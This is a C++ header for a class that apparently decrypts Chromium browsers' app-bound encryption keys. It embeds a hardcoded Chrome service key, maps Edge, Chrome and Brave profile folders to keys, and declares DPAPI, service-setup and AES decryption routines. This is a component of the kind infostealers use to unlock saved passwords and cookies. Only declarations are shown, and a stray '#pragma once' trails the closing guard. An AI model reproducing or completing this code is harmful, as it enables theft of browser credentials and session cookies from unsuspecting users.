#ifndef APPBOUNDKEYDECRYPTOR_H
#define APPBOUNDKEYDECRYPTOR_H

#include "includes\Imports.h"

class AppBoundKeyDecryptor {
private:
    std::string chrome_service_key = "sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c=";
    std::string edge_service_key = "";
    std::string bravebrowser_service_key = "";
    DATA_BLOB* master_key_blob_apb;

    struct KEY_BLOB {
        std::vector<unsigned char> binary;
        DWORD binary_size;
    };

public:
    // Constructor
    AppBoundKeyDecryptor();

    // Destructor (if needed)
    //~AppBoundKeyDecryptor();

    // Member function to initialize ChromiumDecryptor
    bool AppBoundDecryptorInit(std::string path, std::string identifier);
    std::string get_app_bound_browser_key(std::string path);
    std::string read_json(const std::string& filePath);
    std::string DPAPI_Decrypt(std::string encrypted_data);
    BOOL SetupService(std::string path, std::string identifier);
    KEY_BLOB unprotect_service_key(std::string service_key);
    BOOL ConvertToBLOB(std::string hexString);
    BOOL AESKeyDecrypter(std::vector<BYTE> EncryptedBlob, DATA_BLOB* master_key_blob);
    std::string AESDecrypter(std::vector<BYTE> EncryptedBlob);

    std::string GetBrowserStaticKey(const std::string& browserFolder) {
        // Map to associate browser folder paths with their keys
        static std::map<std::string, std::string> browserKeyMap = {
            {"Microsoft\\Edge\\", edge_service_key},
            {"Google\\Chrome\\", chrome_service_key},
            {"BraveSoftware\\Brave-Browser\\", bravebrowser_service_key}
        };

        // Find the process name in the map
        auto it = browserKeyMap.find(browserFolder);
        if (it != browserKeyMap.end()) {
            return it->second;
        }
        else {
            return "";
        }
    }

private:
    // Helper functions if needed
};

#endif /* APPBOUNDKEYDECRYPTOR_H */#pragma once
